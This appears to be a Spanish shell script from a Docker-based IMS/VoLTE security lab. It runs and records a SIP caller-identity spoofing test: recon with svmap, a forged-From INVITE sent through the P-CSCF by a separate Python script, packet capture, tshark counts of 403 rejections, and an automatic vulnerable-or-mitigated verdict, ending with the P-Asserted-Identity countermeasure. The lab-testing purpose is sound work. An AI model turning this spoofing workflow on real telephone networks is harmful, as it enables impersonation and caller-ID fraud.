#!/bin/sh
# ============================================================================
# v3_spoof.sh — V3 Suplantación de identidad (CVSS 7.4, MITRE T1534).
# INVITE con From forjado vía P-CSCF. Éxito = la llamada llega al destino
# mostrando la identidad de la víctima (sin 403).
# Fases: 1-recon (svmap + registro destino) 2-config (PAI?) 3-explotación 4-PAI.
# Uso: ./v3_spoof.sh  (pregunta parámetros; entre [] el valor probado)
# Requiere: lab UP + TARGET registrado (baresip en srsue2).
# Nota: el envío directo al S-CSCF (6060) falla con 478/DNS; usar P-CSCF 4060.
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v3] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
mkdir -p results; touch results/hashes.txt 2>/dev/null || true

VICTIM=$(ask VICTIM "Identidad suplantada (From)" "1001")
TARGET=$(ask TARGET "Destino (To, registrado)" "1002")
PCSCF=$(ask PCSCF "IP P-CSCF" "172.20.0.6")
PORT=$(ask PORT "Puerto P-CSCF" "4060")
DOMAIN=$(ask DOMAIN "Dominio IMS" "ims.mnc070.mcc999.3gppnetwork.org")
TS=$(date -u +%Y%m%dT%H%M%SZ)

# --- Fase 1: recon + pre-condición ---
log "F1 recon: svmap contra $PCSCF..."
docker exec kali svmap "$PCSCF" 2>/dev/null | head -n 5 || true
log "Pre-condición: destino $TARGET registrado en srsue2?"
if docker exec srsue2 sh -c "grep -a -q '200 OK' /tmp/baresip2.log 2>/dev/null"; then
  log "destino registrado OK"
else
  log "AVISO: srsue2 no muestra 200 OK; la llamada puede no llegar aunque el ataque sea válido"
fi

# --- Fase 2: config (¿verifica PAI?) ---
log "F2 config: ¿S-CSCF verifica P-Asserted-Identity? (esperado: NO en lab vulnerable)"
grep -a -iE "P-Asserted|asserted|trusted|403" kamailio/scscf/scscf.cfg | head -n 5 || log "(sin check PAI = vulnerable)"

# --- Fase 3: explotación ---
docker cp attacks/v3_identity_spoof/v3_spoof.py kali:/root/v3_spoof.py
docker exec kamailio sh -c "pkill -x tcpdump 2>/dev/null; rm -f /tmp/v3.pcapng; true"
docker exec -d kamailio sh -c "timeout 25 tcpdump -i eth0 -w /tmp/v3.pcapng 'udp port 4060 or udp port 6060' >/tmp/v3cap.log 2>&1"
sleep 2
OUT=$(docker exec -e VICTIM="$VICTIM" -e TARGET="$TARGET" -e PCSCF="$PCSCF" -e PORT="$PORT" -e DOMAIN="$DOMAIN" \
  kali python3 /root/v3_spoof.py 2>&1)
echo "$OUT"
CALLID=$(echo "$OUT" | grep -a -oE "forged-v3-[0-9]+@[0-9.]+" | head -n 1)
log "Call-ID forjado: ${CALLID:-(ver log)}"
sleep 15
docker exec kamailio sh -c "pkill -x tcpdump 2>/dev/null; true" >/dev/null 2>&1 || true
sleep 1
log "--- S-CSCF (lookup/404/403) ---"
docker exec kamailio sh -c "strings /tmp/scscf.log | grep -a -E 'lookup retcode| 404 | 403 ' | tail -n 4" || log "(sin 403/404 en scscf.log)"
log "--- UE destino (llamada entrante?) ---"
DESTLOG=$(docker exec srsue2 sh -c "grep -a -iE 'incoming|answering|Failed' /tmp/baresip2.log 2>/dev/null | tail -n 3" || true)
echo "$DESTLOG"
# Evidencia a results/ (volumen compartido kali:/root/results -> ./results)
docker cp kamailio:/tmp/v3.pcapng "/tmp/v3_$TS.pcapng" 2>/dev/null || { log "ERROR: sin pcap en kamailio"; exit 1; }
cp "/tmp/v3_$TS.pcapng" "results/v3_spoof_${VICTIM}-to-${TARGET}_$TS.pcapng"
docker cp "results/v3_spoof_${VICTIM}-to-${TARGET}_$TS.pcapng" kali:/root/results/ >/dev/null 2>&1 || true
PCAPK="/root/results/v3_spoof_${VICTIM}-to-${TARGET}_$TS.pcapng"

# kamailio no trae tshark: el conteo se hace en kali (no usar 'tcpdump -Y').
# decode-as para los puertos no estándar del IMS (4060/6060).
DA="-d udp.port==4060,sip -d udp.port==6060,sip -d udp.port==5060,sip"
INVN=$(docker exec kali tshark -r "$PCAPK" $DA -Y 'sip.Method == "INVITE"' 2>/dev/null | wc -l | tr -d ' \r')
FORBN=$(docker exec kali tshark -r "$PCAPK" $DA -Y 'sip.Status-Code == 403' 2>/dev/null | wc -l | tr -d ' \r')
log "--- pcap kamailio: INVITEs=$INVN respuestas 403=$FORBN ---"
if [ "$FORBN" -gt 0 ]; then
  docker exec kali tshark -r "$PCAPK" $DA -Y 'sip.Status-Code == 403' -T fields \
    -e frame.number -e ip.src -e ip.dst -e sip.Status-Code -e sip.Reason-Phrase 2>/dev/null | head -n 3
fi
# El P-CSCF (no el S-CSCF) es quien rechaza la suplantación.
PCSBLK=$(docker exec kamailio sh -c "strings /tmp/pcscf.log 2>/dev/null | grep -a -cE 'Origin Mismatch|Unknown Identity|desde .* != origen'" || true)
log "--- P-CSCF rechazos de identidad: $PCSBLK ---"
H=$(docker exec kali sh -c "sha256sum $PCAPK | cut -d' ' -f1")
echo "$H  v3_spoof_${VICTIM}-to-${TARGET}_$TS.pcapng  V3  $(date -u +%Y-%m-%dT%H:%M:%SZ)  INVITE forjado From $VICTIM To $TARGET Call-ID ${CALLID:-n/a} (INVITEs=$INVN, 403=$FORBN, PCSF-bloqueos=$PCSBLK)" >> results/hashes.txt
log "hash registrado."

# Veredicto automático
if [ "$FORBN" -gt 0 ] || [ "${PCSBLK:-0}" -gt 0 ]; then
  log "VEREDICTO: MITIGADO (P-CSCF rechazó con 403: identidad no coincide con el origen registrado)."
elif echo "$DESTLOG" | grep -a -qiE "answering|incoming.*$VICTIM|call.*from.*$VICTIM"; then
  log "VEREDICTO: VULNERABLE (llamada contestada/mostrada como $VICTIM sin 403)."
elif docker exec kamailio sh -c "strings /tmp/scscf.log | grep -a -q ' 403 '" 2>/dev/null; then
  log "VEREDICTO: MITIGADO (403 observado en S-CSCF)."
else
  log "VEREDICTO: revisar manual (buscar 'answering call ... from sip:$VICTIM' en srsue2 y 403 en pcscf.log)."
fi
log "F4 contramedida: verificar P-Asserted-Identity contra registro autenticado -> re-ejecutar -> 403 esperado."
